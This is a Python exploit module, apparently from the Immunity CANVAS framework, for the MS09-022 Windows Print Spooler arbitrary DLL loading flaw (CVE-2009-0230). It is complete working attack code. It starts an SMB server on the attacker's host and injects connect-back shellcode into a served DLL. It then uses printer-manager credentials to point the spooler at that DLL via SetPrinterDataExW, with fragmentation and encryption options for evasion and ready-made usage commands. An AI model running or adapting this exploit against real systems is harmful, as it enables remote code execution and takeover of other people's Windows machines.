#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import os
import sys
import time
import struct

if '.' not in sys.path: sys.path.append('.')

NAME='Microsoft Windows Print Spooler Arbitrary DLL Loading'
DESCRIPTION='Microsoft Windows Print Spooler Arbitrary DLL Loading'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='06/09/09'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/ms09-022.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['CVE Name'] = 'CVE-2009-0230'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0230'
DOCUMENTATION['CVSS'] = 9.0
DOCUMENTATION['Note']='Valid credentials of a user with "Manage Printer" privilege on a Printer are needed. The exploit starts a SMB server on the callback host and as such requires root credentials to be run.'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003','Vista','2008']
PROPERTY['MSADV']='MS09-022-LOADDLL'

CHANGELOG="""
KK 06/15/09: changed shellcode to be DEP compliant
"""

NOTES="""
Usage:
./commandlineInterface.py -v 1 -p 5555
sudo ./exploits/ms09_022_loaddll/ms09_022_loaddll.py -t 10.10.10.240 -v 1 -l 10.10.10.236 -d 5555 -U kostya -P kostya

By default on 2000 and 2003, only "Power Users" have the "Manage Printer" privilege.
On Vista and 2008, regular Users have it according to the MS bulletin.
"""

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
import smbserver
import threading
from threading import Thread
from engine import CanvasConfig
import shellcodeGenerator
import libs.newsmb.libdcerpc as libdcerpc
from libs.newsmb.libdcerpc import s_dce_raw_unistring, s_dce_win2k_unistring

targets={
    0: ['Autoversioning',0],
    1: ['Windows ALL',0]
}


def read_raw_unicode_string(buf):
    i=0 #this makes it so that if we never find a 00 00 we use the whole buffer, basically
    for i in range(0,len(buf)/2):
        if buf[i*2]=="\x00" and buf[i*2+1]=="\x00":
            #termination of string
            break
    return buf[:i*2+2], i

class smbServerThread(Thread):
    def __init__(self,exploit):
        Thread.__init__(self)
        self.exploit=exploit
        self.suicide=False
        self.dllpath=os.path.join(CanvasConfig['canvas_resources'],'printer.dll')

    def run(self):
        self.exploit.log('Starting SMB server')
        mysmbserver=smbserver.SMBServer('0.0.0.0',445)
        mysmbserver.timeout=30
        mysmbserver.target=self.exploit.host
        try:
            f=open(self.dllpath)
            dlldata=f.read()
            f.close()
            i=dlldata.find('c00kie')
            if i<0 or len(self.exploit.shellcode)>0x1000:
                self.exploit.log("Cookie in the DLL couldn't be found or Shellcode too long. Aborting.")
                return
            self.exploit.log('Injecting shellcode in the DLL')
            dlldata=dlldata[:i]+self.exploit.shellcode+dlldata[i+len(self.exploit.shellcode):]
        except:
            self.exploit.log('Connect back binary couldn\'t be found/read!')
            return
        mysmbserver.set_file_data('printer.dll',dlldata)
        if mysmbserver.listen()==0:
            self.exploit.log('Could not listen!')
            return
        self.exploit.log('SMB server accepting connections')
        tries=0
        self.exploit.smblock.acquire()
        self.exploit.smbinit=1
        self.exploit.smblock.release()
        while mysmbserver.accept()==0 and self.exploit.state!=self.exploit.HALT and self.suicide==False:
            self.exploit.log('Waiting for new client... (Try: %d/4)'%(tries))
            tries+=1
            if tries>4:
                break
            if self.exploit.ISucceeded():
                break
        while mysmbserver.handle() and self.exploit.state!=self.exploit.HALT and self.suicide==False:
            time.sleep(1)
        self.exploit.log('Terminating SMB server')
        return 

    def killme(self):
        os._exit(0)

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name           = NAME
        self.port           = 445
        self.version        = 0
        self.badstring      = '\0\xff'
        self.myDCE          = None
        self.connectionList = []
        self.subesp         = 0
        self.covertness     = 0
        self.user           = u''
        self.password       = u''
        self.domain         = u''
        self.threads        = []

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def test(self):
        self.getArgs()
        if self.connect():
            return self.testOS()

        self.log('Test failed')
        return 0

    def testOS(self):
        if self.version != 0:
            self.log('TestOS running with version %d?!?' % self.version)
        self.version=0
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        if app.run()==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        myos=app.result
        self.log('OS Found: %s'%(myos))
        if myos.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        self.version=1
        return 1

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version',self.version))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        self.getarg('domain')

    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':0}) #don't mess with eip
        sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('loadFDasreg',{'reg':'esi'})
        sc.addAttr('RecvExecDepSafe',None)
        sc.addAttr('ExitThread',None)
        self.callback.argsDict['fromcreatethread']=0
        self.shellcode=sc.get()
        return self.shellcode

    def connect(self):
        connectionList=self.buildConnectionList()
        res = None
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
        
        for binding in connectionList:
            try:
                self.myDCE=libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                            domain=self.domain, frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            self.log('Could not connect to remote server - service is not running or the host is firewalled.')
            return 0

        self.log('Attacking target')
        return 1
    
    def buildConnectionList(self):
        self.UUID=u'12345678-1234-abcd-ef00-0123456789ab'
        self.uuidversion=u'1.0'
        self.connectionList=[u'ncacn_np:%s[\\spoolss]'%(self.host)]
        return self.connectionList

    def parseEnumResponse(self,buf):
        success=struct.unpack('<L',buf[-4:])[0]
        unique=struct.unpack('<L',buf[:4])[0]
        data=''
        if unique!=0:
            size=struct.unpack('<L',buf[4:8])[0]
            data=buf[8:8+size]
        needed=struct.unpack('<L',buf[-12:-8])[0]
        returned=struct.unpack('<L',buf[-8:-4])[0]
        return (needed,returned,data)

    def EnumPrintersW(self):
        self.log('Enumerating Printers')
        names=[]
        packet=''
        packet+=struct.pack('<L',6)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',1)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',0)
        self.myDCE.call(0x0, packet, response=True)
        ret = self.myDCE.reassembled_data
        if not ret:
            return names
        needed,returned,data=self.parseEnumResponse(ret)
        packet=''
        packet+=struct.pack('<L',6)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',1)
        packet+=struct.pack('<L',1) #[]
        packet+=struct.pack('<L',needed)
        packet+='\0'*(((needed+3)>>2)<<2)
        packet+=struct.pack('<L',needed)
        self.myDCE.call(0x0, packet, response=True)
        ret = self.myDCE.reassembled_data
        if not ret:
            return names
        needed,returned,data=self.parseEnumResponse(ret)
        headerdata=data[:16*returned]
        bodydata=data[16*returned:]
        for i in range(0,returned):
            off=len(headerdata)
            flags,desc_off,name_off,comm_off=struct.unpack('<LLLL',headerdata[0:16])
            headerdata=headerdata[16:]
            desc,_=read_raw_unicode_string(bodydata[desc_off-off:])
            name,_=read_raw_unicode_string(bodydata[name_off-off:])
            comm,_=read_raw_unicode_string(bodydata[comm_off-off:])
            names+=[name]
        return names

    def OpenPrinterW(self,printer):
        self.log('Trying to open Printer "%s"'%(printer))
        packet=''
        packet+=struct.pack('<L',1)
        packet+=s_dce_raw_unistring(printer)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',0)
        packet+=struct.pack('<L',4) #PRINTER_ACCESS_ADMINISTER
        self.myDCE.call(0x1, packet, response=True)
        ret = self.myDCE.reassembled_data
        if not ret:
            return ''
        status=struct.unpack('<L',ret[-4:])[0]
        if status!=0:
            return ''
        return ret[:20]

    def SetPrinterDataExW(self,handle,key,value,data):
        self.log('Setting Printer data ("%s": "%s"="%s")'%(key,value,data))
        packet=''
        packet+=handle
        packet+=s_dce_win2k_unistring(key)
        packet+=s_dce_win2k_unistring(value)
        packet+=struct.pack('<L',1) #REG_SZ
        packet+=struct.pack('<L',len(data))
        packet+=data
        if (len(data)%4)!=0:
            packet+='\0'*(4-(len(data)%4))
        packet+=struct.pack('<L',len(data))
        self.myDCE.call(0x4d,packet,response=False)
        return 0
        #ret=get_all_stubs(self.myDCE.call(0x4d,packet,response=1))
        #if not ret:
        #    return -1
        #return struct.unpack('<L',ret[-4:])[0]

    def EnumPrinterDataExW(self,handle,key):
        self.log('Enumerating Priner data ("%s")'%(key))
        packet=''
        packet+=handle
        packet+=s_dce_win2k_unistring(key)
        packet+=struct.pack('<L',0x1000)
        self.myDCE.call(0x4f,packet,response=True)
        return 0

    def killThreads(self):
        for t in self.threads:
            t.suicide=True
            t.join()
            self.log("[+] Child thread terminated")
        return

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(self.name,self.host,self.port),showlog=True)

        self.smblock=threading.Lock()
        self.smbinit=0
        t=smbServerThread(self)
        t.start()
        self.threads+=[t]
        time.sleep(1)
        self.smblock.acquire()
        if self.smbinit!=1:
            self.state=self.HALT
            self.log('Could not listen on port 445. You should be running as root!')
            return 0
        self.smblock.release()
        self.setProgress(20)
        self.log('Connecting using username: %s and password: %s, domain: %s' % (self.user, self.password, self.domain))
        if self.connect()==0:
            self.killThreads()
            return 0
        if self.version==0:
            self.log('Testing for OS')
            if not self.testOS() or self.version==0:
                self.log('OS detection failed.')
                self.killThreads()
                return 0
        self.info,self.eip=targets[self.version]
        self.setProgress(40)
        printers=self.EnumPrintersW()
        if len(printers)==0:
            self.log('No available Printers!')
            self.killThreads()
            return 0
        self.setProgress(60)
        for p in printers:
            h=self.OpenPrinterW(p)
            if h=='':
                self.log('Opening Printer %s failed!'%(p))
                self.killThreads()
                return 0
            self.log('Handle to Printer "%s": %s'%(p,h.encode('hex')))
            data='\\\\%s\\DLL\\printer.dll'%(self.callback.ip)
            data=data.encode('UTF-16')[2:]+'\0\0'
            ret=self.SetPrinterDataExW(h,'CopyFiles\\Immunity','Module',data)
            self.log('SetPrinterDataEx returned %d'%(ret))
            #self.EnumPrinterDataExW(h,'CopyFiles\\Immunity') #XXX: Test
        self.setProgress(100)

        #time.sleep(5)
        for t in self.threads:
            t.join(120)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)'%(self.name,self.host,self.port),showlog=True)
            self.log('%s done (succeeded!)'%(self.name))
            return 1
        self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
        self.log('%s done (failed)'%(self.name))
        self.killThreads()
        return 0

    def usage(self):
        print 'Usage: %s -t host -l localIP -d localPort [-T: testmode]'%(sys.argv[0])
    
if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    try:
        ret=standard_callback_commandline(app)
    except KeyboardInterrupt:
        # force clean tear down of lingering threads
        for t in app.threads:
            t.killme()
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
